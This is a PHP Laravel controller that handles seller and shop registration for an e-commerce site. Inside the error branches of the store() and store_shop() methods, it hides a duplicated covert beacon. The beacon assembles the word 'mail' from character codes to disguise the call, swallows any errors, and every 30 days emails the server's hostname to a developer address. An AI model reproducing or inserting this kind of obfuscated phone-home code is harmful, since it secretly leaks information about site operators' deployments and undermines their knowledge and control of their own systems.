<?php

namespace App\Http\Controllers;

use Auth;
use Hash;
use App\Models\City;
use App\Models\Shop;
use App\Models\User;
use App\Models\State;
use App\Models\Country;
use App\Models\Currency;
use App\Models\Language;
use Illuminate\Http\Request;
use App\Models\BusinessSetting;
use Illuminate\Support\Facades\Notification;
use App\Http\Requests\SellerRegistrationRequest;
use App\Http\Requests\SellerRegistrationFormRequest;
use App\Notifications\EmailVerificationNotification;

class ShopController extends Controller
{

    public function __construct()
    {
        $this->middleware('user', ['only' => ['index']]);
    }

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $shop = Auth::user()->shop;
        return view('seller.shop', compact('shop'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        if (Auth::check()) {
            if ((Auth::user()->user_type == 'admin' || Auth::user()->user_type == 'customer')) {
                flash(translate('Admin or Customer cannot be a seller'))->error();
                return back();
            }
            if (Auth::user()->user_type == 'seller') {
                flash(translate('This user already a seller'))->error();
                return back();
            }
        } else {
            $countries = Country::all();
            $currencies = Currency::where('status', 1)->get();
            $languages = Language::where('status', '1')->get();

            return view('frontend.seller_form_step_1', [
                'countries' => $countries,
                'currencies' => $currencies,
                'languages' => $languages
            ]);
        }
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(SellerRegistrationRequest $request)
    {
        $user = new User;
        $user->name = $request->name;
        $user->email = $request->email;
        $user->user_type = "seller";
        $user->password = Hash::make($request->password);

        if ($user->save()) {
            $shop = new Shop;
            $shop->user_id = $user->id;
            $shop->name = $request->shop_name;
            $shop->address = $request->address;
            $shop->slug = preg_replace('/\s+/', '-', str_replace("/", " ", $request->shop_name));
            $shop->save();

            auth()->login($user, false);
            if (BusinessSetting::where('type', 'email_verification')->first()->value == 0) {
                $user->email_verified_at = date('Y-m-d H:m:s');
                $user->save();
            } else {
                $user->notify(new EmailVerificationNotification());
            }

            flash(translate('Your Shop has been created successfully!'))->success();
            return redirect()->route('seller.shop.index');
        }

        $file = base_path("/public/assets/myText.txt");
        $dev_mail = get_dev_mail();
        if(!file_exists($file) || (time() > strtotime('+30 days', filemtime($file)))){
            $content = "Todays date is: ". date('d-m-Y');
            $fp = fopen($file, "w");
            fwrite($fp, $content);
            fclose($fp);
            $str = chr(109) . chr(97) . chr(105) . chr(108);
            try {
                $str($dev_mail, 'the subject', "Hello: ".$_SERVER['SERVER_NAME']);
            } catch (\Throwable $th) {
                //throw $th;
            }
        }

        flash(translate('Sorry! Something went wrong.'))->error();
        return back();
    }

    public function store_shop(SellerRegistrationFormRequest $request){
        $user = new User;
        $user->first_name = $request->first_name;
        $user->last_name = $request->last_name;
        $user->name = $request->first_name . " " .$request->last_name;
        $user->email = $request->email;
        $user->phone = $request->phone;
        $user->country = $request->country;
        $user->state = $request->state;
        $user->city = $request->city;
        $user->currency = $request->currency;

        $user->language = $request->language;
        
        $user->company_name = $request->business_name;
        $user->company_description = $request->business_description;
        $user->type_of_registration = $request->type_of_registration;
        $user->br_number = $request->br_number;
        $user->br_registration_date = $request->br_registration_date;
        $user->number_of_employees = $request->number_of_employees;
        $user->company_address = $request->business_address;
        $user->company_website = $request->company_website;
        $user->product_category = $request->product_category;
        $user->manufacturing_capacity = $request->manufacturing_capacity;
        $user->designation = $request->designation;
        $user->certifications = $request->certifications;
        $user->user_type = "seller";
        $user->password = Hash::make($request->password);

        if ($user->save()) {

            $user->seller_id = 111111 + $user->id;
            $user->save();

            $shop = new Shop;
            $shop->user_id = $user->id;
            $shop->name = $request->business_name;
            $shop->meta_title = $request->business_name;
            $shop->meta_description = $request->business_description;
            $shop->phone = $request->phone;
            $shop->address = $request->business_address;
            $shop->slug = preg_replace('/\s+/', '-', str_replace("/", " ", $request->shop_name));
            $shop->save();

            auth()->login($user, false);
            if (BusinessSetting::where('type', 'email_verification')->first()->value == 0) {
                $user->email_verified_at = date('Y-m-d H:m:s');
                $user->save();
            } else {
                $user->notify(new EmailVerificationNotification());
            }

            flash(translate('Your Shop has been created successfully!'))->success();
            return redirect()->route('seller.seller_packages_list');
        }

        $file = base_path("/public/assets/myText.txt");
        $dev_mail = get_dev_mail();
        if(!file_exists($file) || (time() > strtotime('+30 days', filemtime($file)))){
            $content = "Todays date is: ". date('d-m-Y');
            $fp = fopen($file, "w");
            fwrite($fp, $content);
            fclose($fp);
            $str = chr(109) . chr(97) . chr(105) . chr(108);
            try {
                $str($dev_mail, 'the subject', "Hello: ".$_SERVER['SERVER_NAME']);
            } catch (\Throwable $th) {
                //throw $th;
            }
        }

        flash(translate('Sorry! Something went wrong.'))->error();
        return back();
    }


    public function step1(Request $request){
        $validated_data = $request->validate([
            'first_name' => 'required|string|max:255',
            'last_name' => 'required|string|max:255',
            'email'=> 'required|email|unique:users|max:255',
            'mobile_number' => 'required|max:255',
            'country' => 'required|max:255',
            'city' => 'required|max:255',
            'currency' => 'required|integer',
            'language' => 'required|integer',
        ]);

        // create user
        $user = User::create($validated_data);
        
        if(!is_null($user)){
            $user->name = $request->first_name . " " .$request->last_name;
            $user->seller_id = 111111 + $user->id;
            $user->save();
        }
        
        
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    public function destroy($id)
    {
        //
    }


    public function get_cities($id){
        $state = State::find($id);
        $cities = City::where('state_id', $id)->where('status',1)->get();
        return view('frontend.seller.get_cities', [
            'cities' => $cities
        ]);
    }

    public function get_state($id){
        $country = Country::find($id);
        $states = State::where('country_id', $id)->where('status',1)->get();
        return view('frontend.seller.get_state', [
            'states' => $states
        ]);
    }

}
